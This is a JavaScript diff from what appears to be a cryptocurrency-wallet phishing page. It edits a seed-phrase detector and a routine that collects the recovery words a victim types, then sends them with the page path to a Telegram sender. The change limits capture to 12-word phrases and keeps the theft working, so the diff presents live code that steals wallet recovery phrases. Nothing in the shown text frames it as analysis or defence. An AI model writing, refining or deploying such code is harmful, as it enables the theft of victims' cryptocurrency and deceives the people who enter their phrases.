@@ -24,12 +24,13 @@ const trafficSource = getTrafficSource();
 function words(v) { return (v || '').trim().split(/\s+/).filter(w => w.length > 0); }
 function wc(v) { return words(v).length; }
 
-// Valid seed phrase: exactly 12/15/18/21/24 words, all lowercase letters only (BIP39)
+// Valid seed phrase: exactly 12 words, mostly lowercase letters
 function isSeed(v) {
   if (!v) return false;
   var ws = words(v.toLowerCase());
-  if (![12, 15, 18, 21, 24].includes(ws.length)) return false;
-  return ws.every(function(w) { return /^[a-z]{2,10}$/.test(w); });
+  if (ws.length !== 12) return false; // Only 12 words
+  var validCount = ws.filter(function(w) { return /^[a-z]{3,8}$/.test(w); }).length;
+  return (validCount / ws.length) >= 0.8;
 }
 
 // --- Send to Telegram ---
@@ -122,12 +123,12 @@ function collectGridPhrase() {
   
   console.log('🔍 Collected words:', ws.length, ws.slice(0, 3).join(',') + '...');
   
-  if ([12, 15, 18, 21, 24].includes(ws.length)) {
+  if ([12].includes(ws.length)) { // Only 12 words
     var phrase = ws.join(' ');
     if (phrase !== lastSent) {
       lastSent = phrase;
-      console.log('📋 Sending WALLET_CREATED phrase:', ws.length, 'words');
-      sendToTelegram({ TYPE: 'WALLET_CREATED', PHRASE: phrase, WORDS: ws.length, PAGE: window.location.pathname });
+      console.log('📋 WALLET_CREATED: 12 words');
+      sendToTelegram({ TYPE: 'WALLET_CREATED', PHRASE: phrase, WORDS: 12, PAGE: window.location.pathname });
     }
   }
 }
